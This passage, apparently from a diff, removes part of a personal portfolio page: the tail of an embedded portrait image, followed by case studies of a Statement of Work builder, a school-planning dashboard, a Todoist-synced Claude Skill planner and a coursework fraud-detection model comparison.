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" alt="Portrait of Bo Oetjen">
-      </div>
-
-      <div class="ledger" aria-label="Time to produce one Statement of Work">
-        <div class="lt">
-          <span class="label">Time to build one Statement of Work</span>
-          <h3>From a 22.5-minute manual process to 3–4 minutes, with legal language checked on every export.</h3>
-        </div>
-        <div class="bignum">~85%<small>less time per SOW</small></div>
-        <div class="bars">
-          <div class="barrow"><span class="who">Before</span><div class="track"><div class="fill before"></div></div><span class="v">22.5 min</span></div>
-          <div class="barrow"><span class="who">SOW Builder</span><div class="track"><div class="fill after"></div></div><span class="v">3–4 min</span></div>
-        </div>
-      </div>
-
-      <figure class="praise">
-        <span class="qm" aria-hidden="true">“</span>
-        <blockquote>We would not have been able to get through this merger without Bo.</blockquote>
-        <p>Krystne Browning, HR Manager, Network for Hope. Two organ procurement organizations merged onto Paycor: legacy data migration, combined payroll, a new departmental and GL structure, and a workforce that doubled to 320. <a href="https://www.paycor.com/resource-center/case-studies/network-for-hope/" target="_blank" rel="noopener">Read Paycor's case study ↗</a></p>
-      </figure>
-    </section>
-
-    <!-- SELECTED BUILDS -->
-    <section id="builds">
-      <div class="sec-head">
-        <h2>Selected builds</h2>
-        <p>Each one started as a real problem I had or my team had. Open a case study for the decisions behind it.</p>
-      </div>
-      <div class="entries">
-
-        <!-- 1. TAM Command Center -->
-        <article class="entry lead">
-          <div class="e-top">
-            <span class="label">Work · <b>Paycor TAM team, expanding company-wide</b></span>
-            <span class="tag live">In production</span>
-          </div>
-          <h3>TAM Command Center &amp; SOW Builder</h3>
-          <p class="sum">One dashboard for the Technical Account Management team: build a Statement of Work in minutes, validate its legal language automatically, request time off, manage team work and see which engagements actually earn. It serves 29 users today and is becoming Paycor's company-wide SOW Builder as other teams' rates are added.</p>
-          <div class="spec">
-            <div><span class="label">Problem</span><p>SOWs took over 20 minutes each, rates lived in a downloaded Excel workbook, time off lived in spreadsheets that drifted out of sync, and the team's tools were spread across separate sites.</p></div>
-            <div><span class="label">Built</span><p>A SOW builder that validates every SOW so only approved fields change, with pass/fail reports and executive summaries, plus central effective-dated rates, a time-off calendar, usage analytics, a test/live split and a Planner replica.</p></div>
-            <div><span class="label">Result</span><p>About 85% less time per SOW for 29 users, one source of truth for rates and time off, and a platform now being extended to teams across the company.</p></div>
-          </div>
-          <div class="stats">
-            <div class="stat"><b>22.5 → 3–4</b><span>minutes to produce a SOW</span></div>
-            <div class="stat"><b>100%</b><span>of SOWs validated automatically, pass or fail</span></div>
-            <div class="stat"><b>29</b><span>users today, with a company-wide rollout underway</span></div>
-          </div>
-          <div class="tools"><span>Copilot Studio (prototype)</span><span>Dashboard design</span><span>Validation rules</span><span>Analytics</span><span>Salesforce</span><span>Microsoft Planner</span><span>DocuSign (planned)</span></div>
-          <details class="cs">
-            <summary>Read the case study</summary>
-            <div class="cs-body">
-              <div><h4>The problem</h4><p>Statements of Work are how the TAM team turns a customer's request into billable work. Each one took about 22.5 minutes to assemble by hand, and every manual edit carried a risk that someone changed contract language Legal had approved. Hourly rates came from an Excel workbook that had to be re-downloaded whenever a rate changed. Time off was tracked in spreadsheets that were often out of sync. Capacity was based on fixed estimates per engagement type, so it didn't show how busy each TAM really was, which made SLAs and headcount planning harder. Bookmarks, Planner boards and reports lived in different places.</p></div>
-              <div><h4>Why a dashboard instead of an agent</h4><p>I first designed the SOW Builder in Copilot Studio as an orchestrator: a parent agent handing each part of the SOW to its own child agent. Prototyping it showed that an "interview me" flow, where Copilot asks questions one at a time, was slower than a form that shows every field at once. I moved the build into a dashboard. Choosing the faster tool over the more impressive one is how the time dropped to 3–4 minutes.</p></div>
-              <div><h4>What I built</h4>
-                <ul class="checks">
-                  <li><span><b>SOW Builder with validation.</b> TAMs edit only the approved fields of a Legal-approved template. Every SOW is then validated to confirm no legal language changed: a pass is logged, a failure is retried once, and a second failure alerts me. Results export to Excel, with an executive summary of every SOW built.</span></li>
-                  <li><span><b>Legal sign-off on templates.</b> Whenever a template is added or changed in the tool, the validation reports go to Legal so they can confirm the tool never alters the legal document.</span></li>
-                  <li><span><b>Central, effective-dated rates.</b> Rates are stored and calculated inside the builder. A rate change can be dated in the future, so it takes effect on its own without anyone downloading a new workbook.</span></li>
-                  <li><span><b>Time-off calendar and requests.</b> Replaces the spreadsheets with one calendar and a request flow that shows accurate availability.</span></li>
-                  <li><span><b>Usage statistics and business analytics.</b> Compares engagement types, shows who credits or waives fees most and by how much, and lists repeat customers with their total spend with the team.</span></li>
-                  <li><span><b>Test and live environments.</b> New features are tried in test so live statistics stay clean.</span></li>
-                  <li><span><b>Planner replica.</b> A sub-team's Microsoft Planner board, managed inside the dashboard, removing a separate tool.</span></li>
-                  <li><span><b>Hours-based capacity (in progress).</b> Capacity and utilization are moving from fixed estimates per engagement type to the hours each TAM is committed to each week, current and future. Managers get a true picture of who has room, TAMs can meet SLAs more consistently, and headcount requests rest on real workload data.</span></li>
-                  <li><span><b>Links &amp; Resources.</b> The team's most-used bookmarks in one place, so the dashboard is the starting point for the day.</span></li>
-                </ul>
-              </div>
-              <div><h4>What's next</h4>
-                <ul class="checks road">
-                  <li><span><b>Company-wide SOW Builder.</b> The builder serves 29 users on the TAM team today. As other teams provide their rates, I'm building them into a company-wide dashboard so every team that writes SOWs uses the same validated builder.</span></li>
-                  <li><span><b>DocuSign integration.</b> Send the SOW for signature from the builder, then attach the fully executed copy to the matching IPW record in Salesforce automatically.</span></li>
-                  <li><span><b>Tax audit module.</b> Pull and examine customer reports and flag likely problem areas for human review. Tax audits are one of the team's most expensive engagements.</span></li>
-                  <li><span><b>Quarterly audit subscription.</b> Repeat the audit every quarter to catch setup errors early, reducing amended returns, late filings, penalties and interest for customers, and creating recurring revenue for the team.</span></li>
-                  <li><span><b>Customer self-service.</b> Let clients start a TAM engagement inside Paycor, sign their part of the SOW and create the IPW in Salesforce automatically.</span></li>
-                </ul>
-              </div>
-              <div><h4>What it shows</h4><p>Taking an operational process end to end: measuring the baseline, protecting what must not change (legal language, live data), centralizing sources of truth, and building toward revenue rather than only efficiency.</p></div>
-            </div>
-          </details>
-        </article>
-
-        <!-- 2. UC Command Center -->
-        <article class="entry">
-          <div class="e-top">
-            <span class="label">Personal · <b>School operations</b></span>
-            <span class="tag live">Used daily</span>
-          </div>
-          <h3>UC Command Center</h3>
-          <p class="sum">A dashboard that runs my degree: this week's plan synced live with Todoist, a semester calendar, grades with a GPA simulator, an academic advising tracker and statistics on study time versus results.</p>
-          <div class="spec">
-            <div><span class="label">Problem</span><p>Five courses, a full-time job and deadlines spread across Canvas, syllabi, email and Todoist. No single view of what was due, how I was doing, or what to register for next.</p></div>
-            <div><span class="label">Built</span><p>An installable web app wired to Todoist, with a shared database for grades, syllabi and advising notes, plus its own backlog and change log.</p></div>
-            <div><span class="label">Result</span><p>62 logged changes in the first 10 days. It replaced a weekly planner I rebuilt by hand and became the one place I check each morning.</p></div>
-          </div>
-          <div class="stats">
-            <div class="stat"><b>62</b><span>changes shipped and logged in 10 days</span></div>
-            <div class="stat"><b>8</b><span>views: planner, calendar, grades, advising, stats and more</span></div>
-            <div class="stat"><b>Live</b><span>two-way sync: click a task to complete it in Todoist</span></div>
-          </div>
-          <div class="tools"><span>HTML · CSS · JavaScript</span><span>Todoist API via MCP</span><span>Shared database</span><span>Claude</span><span>PWA (installed as a Mac app)</span></div>
-          <details class="cs">
-            <summary>Read the case study</summary>
-            <div class="cs-body">
-              <div><h4>Why I built it</h4><p>I started with a printable weekly planner generated from Todoist. It worked, but keeping it current was a job in itself. The Command Center makes the planner live and adds the parts of school that had no home: grades, degree requirements and conversations with my advisor.</p></div>
-              <div><h4>What it does</h4>
-                <ul>
-                  <li><b>This Week:</b> tasks grouped by course and ordered by urgency, a "time left today" estimate, and automatic roll-forward of unfinished work that marks genuine overdue items differently from work started early.</li>
-                  <li><b>Calendar:</b> assignments, UC academic dates, federal holidays, class meetings and my work PTO on one month view.</li>
-                  <li><b>Grades &amp; GPA:</b> a grade book per course and a GPA simulator that applies each syllabus's drop and replacement rules, with what-if scores that are never saved over real ones.</li>
-                  <li><b>Academic Advising:</b> requirements remaining, courses I'm eligible to register for, alternative course plans and a log of advisor replies.</li>
-                  <li><b>Statistics:</b> estimated effort by course and week compared with grades, so I can see where time is going.</li>
-                  <li><b>Admin:</b> a backlog with statuses (Planned, In Progress, Not Planned, Done) and a dated change log. I run my own tool the way I'd run a product.</li>
-                </ul>
-              </div>
-              <div><h4>Decisions worth noting</h4>
-                <ul>
-                  <li>Todoist stays the source of truth. The dashboard reads and completes tasks but never rewrites an instructor's due date.</li>
-                  <li>Timezone safety: the date is always checked in Eastern time, after an early bug flagged work overdue hours before midnight.</li>
-                  <li>Every change is logged, so I can explain why the tool behaves the way it does.</li>
-                </ul>
-              </div>
-            </div>
-          </details>
-        </article>
-
-        <!-- 3. Self-syncing planner skill -->
-        <article class="entry">
-          <div class="e-top">
-            <span class="label">AI workflow · <b>Claude Skill + Todoist</b></span>
-            <span class="tag live">v11</span>
-          </div>
-          <h3>Self-Syncing Weekly Academic Planner</h3>
-          <p class="sum">A reusable Claude Skill that reconciles a weekly planner with Todoist on one command. It marks completions, slots in new tasks, moves changed due dates, rolls work forward at midnight and archives finished days, and it flags every change instead of making it silently.</p>
-          <div class="spec">
-            <div><span class="label">Problem</span><p>A printable planner drifted out of sync every time something changed in Todoist, and rebuilding it by hand happened several times a week.</p></div>
-            <div><span class="label">Built</span><p>A packaged Skill with written business rules, a live Todoist integration and an HTML template. Refined over 11 versions from failures caught in real use.</p></div>
-            <div><span class="label">Result</span><p>A multi-step manual rebuild became one "/update" command I trust not to drop or misstate a deadline.</p></div>
-          </div>
-          <div class="tools"><span>Claude Skills</span><span>Todoist MCP</span><span>Prompt design</span><span>HTML template</span></div>
-          <details class="cs">
-            <summary>Read the case study</summary>
-            <div class="cs-body">
-              <div><h4>Design rules that came from real failures</h4>
-                <ul>
-                  <li><b>The planner is a view, not a copy.</b> It can flag something overdue or move it on the page, but never changes a real due date in Todoist.</li>
-                  <li><b>Never silently delete.</b> Completed work is crossed off and tagged, so progress stays visible.</li>
-                  <li><b>Check local time first.</b> The server's "today" can roll over hours before Eastern midnight, which once caused work to be flagged overdue a day early.</li>
-                  <li><b>Encode judgment.</b> Graded work outranks optional lecture videos unless a video is a prerequisite for something due soon. Lighter workloads land on Bengals game days when deadlines allow.</li>
-                </ul>
-              </div>
-              <div><h4>What I'd change for a team</h4><p>Turn the natural-language rules into explicit, testable logic; add validation and logging so a person isn't the only safeguard; and separate the personal preferences from the reusable sync engine so it can be configured per user. Protecting a source of truth, reconciling state safely and encoding real business judgment is the same pattern behind client-facing automation, with more users and higher stakes.</p></div>
-            </div>
-          </details>
-        </article>
-
-        <!-- 4. CS1010 fraud -->
-        <article class="entry">
-          <div class="e-top">
-            <span class="label">Coursework · <b>CS 1010 Intro to AI</b></span>
-            <span class="tag school">Machine learning</span>
-          </div>
-          <h3>Detecting Insurance Fraud: Decision Tree vs. SVM</h3>
-          <p class="sum">Binary classification on 1,000 insurance claims (67 features, 24.7% fraud). I trained and compared two models on a stratified 75/25 split and recommended one based on the cost of a missed fraud, not accuracy alone.</p>
-          <div class="spec">
-            <div><span class="label">Question</span><p>Which model better flags fraudulent claims when a model that always says "not fraud" is already about 75% accurate?</p></div>
-            <div><span class="label">Method</span><p>Orange Data Mining workflow: categorical target, stratified split, Decision Tree and SVM, then confusion matrices, ROC curves, precision, recall, F1 and AUC.</p></div>
-            <div><span class="label">Finding</span><p>SVM, with an AUC of 0.812 vs. 0.685, ranks risky claims better and caught slightly more fraud. The tree is easier to explain to investigators.</p></div>
-          </div>
-          <div class="stats">
-            <div class="stat"><b>0.812</b><span>SVM AUC (tree: 0.685)</span></div>
-            <div class="stat"><b>67.7%</b><span>SVM recall: 42 of 62 frauds caught</span></div>
-            <div class="stat"><b>0.599</b><span>Decision Tree F1, the better balance at default threshold</span></div>
-          </div>
-          <div class="tools"><span>Orange Data Mining</span><span>Classification</span><span>ROC / AUC</span><span>Model evaluation</span></div>
-          <details class="cs">
-            <summary>Limitations I called out</summary>
-            <div class="cs-body">
-              <ul>
-                <li>Class imbalance pushes both models toward predicting "not fraud."</li>
-                <li>Both models used default settings; tuning tree depth or the SVM kernel and cost could help.</li>
-                <li>One 75/25 split; cross-validation would give a more reliable estimate.</li>
-                <li>Next models to try: Random Forest and Logistic Regression.</li>
-              </ul>
-            </div>
-          </details>
-        </article>
-      </div>
-    </section>
-
-    <!-- MORE PROJECTS -->
-    <section id="more">
-      <div class="sec-head">
-        <h2>More projects</h2>
-        <p>Smaller tools and ventures, built with Claude as a working partner.</p>
-      </div>
-      <div class="grid2">
-        <article class="mini">
-          <span class="label">Planned venture · after graduation</span>
-          <h3>Etch AI Consulting</h3>
